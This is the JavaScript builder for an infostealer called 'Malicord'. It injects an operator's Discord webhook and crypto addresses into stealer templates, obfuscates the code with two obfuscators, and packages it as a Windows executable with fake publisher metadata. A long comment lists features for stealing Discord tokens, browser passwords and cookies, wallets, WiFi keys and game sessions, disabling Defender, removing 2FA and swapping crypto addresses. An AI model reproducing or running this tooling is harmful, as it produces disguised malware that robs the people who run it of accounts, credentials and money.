const fs = require("fs");
const path = require("path");
const axios = require("axios");
const JavaScriptObfuscator = require("javascript-obfuscator");
const { build, Platform, Arch } = require("electron-builder");
const sourceDirectory = "./script";
const jsConfuser = require("js-confuser");

/*
                @credits:
                - Developers: FalseKSCH | Shiris les plus beaux des negres
                - Bro CPP (btw gay): Mcraxker
                - Friend: Irax | NolayDsc | M4t

                 @Todo List:
                - second run remove fake error execute in silent
                - fix filter.js
                - get potential passwords discord
                - customize size
                - don't appear in task manager
                - anti launch spam

                - add reddit/insta/tiktok (un jour inshallah)
                - Force Disabler 2fa (un jour inshallah)
                - Cheat Auth Stealer (un jour inshallah)
                - custom author & desc (un jour inshallah)

                @latest:
                - fix removesub [BOT ADMIN] ✅
                - fix unicode module error ✅
                - /help [BOT] ✅
                - /features [BOT] ✅
                - key license system (/claim) ✅
                - binder ✅

                @OK:
                - Steal Windows Wifi Passwords ✅
                - Steal Windows Clipboard ✅
                - webpack ✅
                - New obfuscation ✅
                - enable admin if taskmngr and defender killed ✅
                - patch injection ✅
                - upload sur transfer si pb gofile ✅
                - chrome injection steal cookies/history/keylogger ✅
                - Fix exodus injection ✅
                - steal in other lecteur usb/reseau ✅
                - /remove abonnement ✅
                - ask admin with "CMD.exe" name + verified editor ✅
                - get antivirus installed ✅
                - Bot Add option "disable settings (task manager & defender)" ✅
                - disable task manager ✅
                - Disable defender ✅
                - Bot option "Chrome injection" ✅
                - Fix "startup" ✅
                - if chrome inject = true alors ask admin => task manager disabler => cached files ✅
                - Chrome Extensions Injector ✅
                - fix minecraft session ✅
                - fix twitter location ✅
                - fix canary/PTB injection bugged ✅
                - Ubisoft Play stealer (Uplay) ✅
                - config saver (/config create, config load, config modify) ✅
                - steal mozilla: cookies, history, downloads, autofills, passwords, credits cards ✅ 
                - le /getrole customer ✅
                - send config when build ✅
                - if keywords.zip is empty remove don't upload ✅
                - emoji injection ✅
                - inject ptb x canary x other clients ✅
                - roblox.txt ✅
                - partner emoji discord.js ✅
                - Embeds rewrited ✅
                - Fix "Clients" in "Games" Space ✅
                - force change mail ✅
                - injection change email +1 (check if used) +2 ✅
                - add to bot settings "auto remove 2fa" ✅
                - Auto Mail Changer ✅
                - Disable Email notification ✅
                - auto remove 2fa ✅
                - get backups codes ✅
                - Auto Mail Changer ✅
                - Disable Email notification ✅
                - Auto remove 2fa ✅
                - Get backups codes ✅
                - Nitro Badges Boost in First Embed ✅
                - Fix Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) ✅
                - Detail steam login ✅
                - Modifier tout les embeds (couleur / roblox / minecraft) ✅
                - Exodus injection (https://github.com/ld0l/Eject/) ✅
                - Parse All Bots / Guilds owner|admin / UHQ Friends ✅
                - Add Fake Error ✅
                - Créer un fichier ThiefCat pour l'injection car ça permet d'init l'inject ✅
                - Roblox Session ✅
                - NordVPN / OpenVPN (using glob) ✅
                - NationGlory login ✅
                - Ubisoft ✅
                - Steal RiotGame ✅
                - Take a Screenshot ✅
                - Add to startup ✅
                - Debug Killer (Kill task gestionary/CMD) ✅
                - Anti Debug / Anti Firewall ✅
                - Modify System Informations ✅
                - Ajouter systeme de config ✅
                - steam | battlenet | EpicGame Session ✅
                - Crypto Adress Swaper ✅
                - Discord Token Grabber (for discord app) ✅
                - Bypass TokenProtector | BetterDiscord ✅
                - Fix injecteur  ✅
                - Fix Extension wallets stealer ✅
                - Steal Wallets App: Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi ✅
                - Add Minecraft Session ✅
                - Modifier le nom des fichiers ils sont trop laid ✅
                - Steal Epicgame ✅
                - Steal Growtopia ✅

*/

async function obfufirst(config) {
  const webhook = config.webhook,
    author = config.author ?? "Fuzzles",
    license = config.license ?? "MIT IC",
    description = config.description ?? "Dont do drugs",
    appCompanyName = config.appCompanyName ?? "LegalSec",
    appLegalCopyright = config.appLegalCopyright ?? "copyright Fuzzles inc",
    appFileDescription = config.description ?? "NukerRace",
    version = config.version ?? "1.5.9",
    api = config.api ?? "%API_URL%",
    name = config.name ?? "NukerRace",
    disable2fa = config.disable2fa ?? "yes",
    clientemail = config.clientemail ?? "kschdediscord@gmail.com",
    automailchanger = config.automailchanger ?? "no",
    blockdebug = config.debug ?? "no",
    game = config.games ?? "yes",
    launchers = config.launcher ?? "yes",
    inject = config.inject ?? "yes",
    clients = config.clients ?? "yes",
    wallets = config.wallets ?? "yes",
    vpn = config.vpn ?? "yes",
    sysinfo = config.sysinfo ?? "yes",
    social = config.social ?? "yes",
    browsers = config.browsers ?? "yes",
    fakeerror = config.fakeerror ?? "yes",
    walletswaper = config.walletswaper ?? "no",
    trollsound = config.trollsound ?? "none",
    setdisabler = config.setdisabler ?? "yes",
    chromeinjection = config.chromeinjection ?? "yes",
    trollimage = config.trollimage ?? "no",
    messagefakeerror = config.msgfakeerror ?? "Application Error. The error is client side.",
    ltc = config.ltc ?? "",
    btc = config.btc ?? "",
    eth = config.eth ?? "",
    dash = config.dash ?? "",
    xlm = config.xlm ?? "",
    bch = config.bch ?? "",
    xrp = config.xrp ?? "",
    neo = config.neo ?? "",
    doge = config.doge ?? "";
  try {
    const tosend = {
      username: "Malicord",
      avatar_url:
        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/novalogo3.png",
      embeds: [
        {
          color: 10038562,
          description: `[<:nova:1132934190032244786> Malicord Configuration](https://t.me/Sordeal)`,
          fields: [
            {
              name: "**Files Name:**",
              value: `\`${name}\``,
              inline: true,
            },
            {
              name: "**Chrome Injection:**",
              value: `\`${
                chromeinjection == "yes" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**2FA Disabler:**",
              value: `\`${
                disable2fa == "true" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**Auto Mail Changer:**",
              value: `\`${
                automailchanger == "true" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**Anti Debug & Anti VM:**",
              value: `\`${
                blockdebug == "yes" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
            {
              name: "**Games Stealer:**",
              value: `\`${game == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Launchers Stealer:**",
              value: `\`${launchers == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Inject into discord & Exodus & Atomic Clients:**",
              value: `\`${inject == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal SFTP / SSH / RDP Clients controler:**",
              value: `\`${clients == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal Wallets:**",
              value: `\`${wallets == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal VPN:**",
              value: `\`${vpn == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal Systeme informations**",
              value: `\`${sysinfo == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal social app:**",
              value: `\`${social == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Steal Browsers Credentials:**",
              value: `\`${browsers == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Fake Error:**",
              value: `\`${fakeerror == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
              inline: true,
            },
            {
              name: "**Swap Crypto Address:**",
              value: `\`${
                walletswaper == "yes" ? "Enabled ☑️" : "Disabled ❌"
              }\``,
              inline: true,
            },
          ],
          footer: {
            text: "@MALICORD | https://t.me/Sordeal",
          },
        },
      ],
    };
    await axios({
      url: config.webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      data: tosend,
    });
  } catch (e) {}

  const destinationDirectory = "./Build/script/" + name;

  const copyDirectory = (source, destination) => {
    if (!fs.existsSync(destination)) {
      fs.mkdirSync(destination);
    }
    const files = fs.readdirSync(source);
    files.forEach((file) => {
      const sourceFilePath = path.join(source, file);
      const destinationFilePath = path.join(destination, file);

      if (fs.statSync(sourceFilePath).isFile()) {
        fs.copyFileSync(sourceFilePath, destinationFilePath);
      } else if (fs.statSync(sourceFilePath).isDirectory()) {
        copyDirectory(sourceFilePath, destinationFilePath);
      }
    });
  };

  const webpackthisshit = async (directory) => {
    await obfuscateFilesbis(directory);
  };
  const obfuscateFiles = async (directory) => {
    const files = fs.readdirSync(directory);
    files.forEach(async (file) => {
      const filePath = path.join(directory, file);
      if (fs.statSync(filePath).isDirectory()) {
        obfuscateFiles(filePath);
      } else if (
        file.endsWith(".js") &&
        !filePath.includes("node_modules") &&
        !file.includes("bundle.js") &&
        !file.includes("build.js")
      ) {
        const originalCode = fs.readFileSync(filePath, "utf-8");
        const obfuscationResult = JavaScriptObfuscator.obfuscate(originalCode, {
          identifierNamesGenerator: "dictionary",
          identifiersDictionary: [
            "KSCH",
            "theGoat",
            "NovaOnTop",
            "NoVastillbetter",
            "KSCNova",
            "N0V4",
            "TheGangNova",
            "EpsilonAreGays",
            "Sucker",
            "LetMyCode",
            "ChillDontDeobf",
          ],
          renameGlobals: true,
          selfDefending: false,
        });
        await fs.writeFileSync(filePath, obfuscationResult.getObfuscatedCode());
      }
    });
  };
  const obfuscateFilesbis = async (directory) => {
    const files = fs.readdirSync(directory);
    for (const file of files) {
      const filePath = path.join(directory, file);
      if (fs.statSync(filePath).isDirectory()) {
        await obfuscateFilesbis(filePath);
      } else if (
        file.endsWith(".js") &&
        !filePath.includes("node_modules") &&
        !file.includes("build.js")
      ) {
        const originalCode = fs.readFileSync(filePath, "utf-8");
        let counter = 0;
        const obfuscatedCode = await jsConfuser.obfuscate(originalCode, {
          target: "node",
          controlFlowFlattening: 0,
          minify: false,
          globalConcealing: true,
          stringCompression: 1,
          stringConcealing: 0.9,
          stringEncoding: 0.3,
          stringSplitting: 1,
          deadCode: 0,
          calculator: 0.5,
          compact: true,
          movedDeclarations: false,
          objectExtraction: false,
          stack: true,
          duplicateLiteralsRemoval: 0,
          flatten: false,
          dispatcher: true,
          opaquePredicates: 0,
          shuffle: { hash: 0.6, true: 0.6 },
          renameVariables: false,
          renameGlobals: false,
        });
        await fs.writeFileSync(filePath, obfuscatedCode);
      }
    }
  };
  const replaceBat = (filePath) => {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    const replacedContent = fileContent.replace(
      /%DESTINATION%/g,
      destinationDirectory
    );
    fs.writeFileSync(filePath, replacedContent);
  };
  const replaceCFG = (filePath) => {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    const replacedContent = fileContent
      .replace(/%DESCRIPTION%/g, description)
      .replace(/%AUTHOR%/g, author)
      .replace(/%LICENSE%/g, license)
      .replace(/%APPCOMPAGNYNAME%/g, appCompanyName)
      .replace(/%COPYRIGHT%/g, appLegalCopyright)
      .replace(/%FILEDESCRIB%/g, appFileDescription)
      .replace(/%VERSION%/g, version)
      .replace(/%VERSIONPRODUCT%/g, version);
    fs.writeFileSync(filePath, replacedContent);
  };
  const replaceWebhook = (filePath) => {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    const replacedContent = fileContent
      .replace(/%WEBHOOK%/g, webhook)
      .replace(/%SETTINGS_DISABLER%/g, setdisabler)
      .replace(/%CHROME_INJECTION%/g, chromeinjection)
      .replace(/%CLIENT_EMAIL%/g, clientemail)
      .replace(/%AUTO_MAIL_CHANGER%/g, automailchanger)
      .replace(/%DISABLE_2FA%/g, disable2fa)
      .replace(/%DEBUG_OPTIONS%/g, blockdebug)
      .replace(/%GAMES_OPTIONS%/g, game)
      .replace(/%LAUNCHERS_OPTIONS%/g, launchers)
      .replace(/%INJECT_OPTIONS%/g, inject)
      .replace(/%CLIENTS_OPTIONS%/g, clients)
      .replace(/%WALLETS_OPTIONS%/g, wallets)
      .replace(/%VPN_OPTIONS%/g, vpn)
      .replace(/%SYSINFO_OPTIONS%/g, sysinfo)
      .replace(/%SOCIALAPP_OPTIONS%/g, social)
      .replace(/%BROWSERS_OPTIONS%/g, browsers)
      .replace(/%FAKEERROR_OPTIONS%/g, fakeerror)
      .replace(/%SWAP_OPTIONS%/g, walletswaper)
      .replace(/%TROLL_SOUND%/g, trollsound)
      .replace(/%TROLL_IMAGE%/g, trollimage)
      .replace(/%FAKE_ERROR_MSG%/g, messagefakeerror)
      .replace(/%API_URL%/g, api)
      .replace(/%LTC_ADD%/g, ltc)
      .replace(/%BTC_ADD%/g, btc)
      .replace(/%ETH_ADD%/g, eth)
      .replace(/%XLM_ADD%/g, xlm)
      .replace(/%DASH_ADD%/g, dash)
      .replace(/%BCH_ADD%/g, bch)
      .replace(/%XRP_ADD%/g, xrp)
      .replace(/%NEO_ADD%/g, neo)
      .replace(/%DOGE_ADD%/g, doge);
    fs.writeFileSync(filePath, replacedContent);
  };

  const traverseFiles = (directory) => {
    const files = fs.readdirSync(directory);
    files.forEach((file) => {
      const filePath = path.join(directory, file);
      if (fs.statSync(filePath).isDirectory()) {
        traverseFiles(filePath);
      } else if (file.endsWith(".js") && !filePath.includes("node_modules")) {
        replaceWebhook(filePath);
      } else if (file.endsWith(".json") && !filePath.includes("node_modules")) {
        replaceCFG(filePath);
      } else if (file.endsWith("build.bat")) {
        replaceBat(filePath);
      }
    });
  };
  copyDirectory(sourceDirectory, destinationDirectory);
  await traverseFiles(destinationDirectory);
  await webpackthisshit(destinationDirectory);

  return destinationDirectory;
}

async function building(dest, config) {
  let name = config.name ?? "malicord";
  let icon =
    "https://cdn.discordapp.com/attachments/1138396644270932061/1142791529887453274/lilnova.ico";
  try {
    if (icon) {
      const response = await axios.get(icon, { responseType: "arraybuffer" });
      const iconBuffer = Buffer.from(response.data);
      const iconSize = iconBuffer.length;

      if (iconSize <= 500 * 1024) {
        fs.writeFileSync(`${dest}/node.ico`, iconBuffer);
      }
    }

    const builderConfig = {
      targets: Platform.WINDOWS.createTarget(null, Arch.x64),
      config: {
        appId: "win32",
        productName: `${name}`,
        win: {
          artifactName: `${name}.exe`,
          target: "portable",
          icon: `${dest}/node.ico`,
        },
        compression: "normal",
        buildVersion: "1.0.0",
        electronVersion: "17.1.0",
        nodeGypRebuild: false,
        npmRebuild: true,
        directories: {
          app: `${dest}`,
          output: `./Build/dist/${name}`,
        },
      },
    };

    await build(builderConfig);

    fs.unlinkSync(`./Build/dist/${name}/builder-debug.yml`);
    fs.unlinkSync(`./Build/dist/${name}/builder-effective-config.yaml`);
    fs.rmSync(`./Build/dist/${name}/win-unpacked`, { recursive: true });
    fs.rmSync(`${dest}`, { recursive: true }); fs.rename(`./Build/dist/${name}/${name}.exe`, `./${name}.exe`, (err) => {
      if (err) {
        console.error('File inside : ./Build/dist');
      } else {
        console.log('Files: ' + name);
      }
    });
  } catch (err) {}
}

async function main(config) {
  console.log("starting obfuscation...")
  const obfupath = await obfufirst(config);
  console.log("Building?")
  await building(obfupath, config);
  console.log("Finished.")
}

module.exports = {
  main,
};
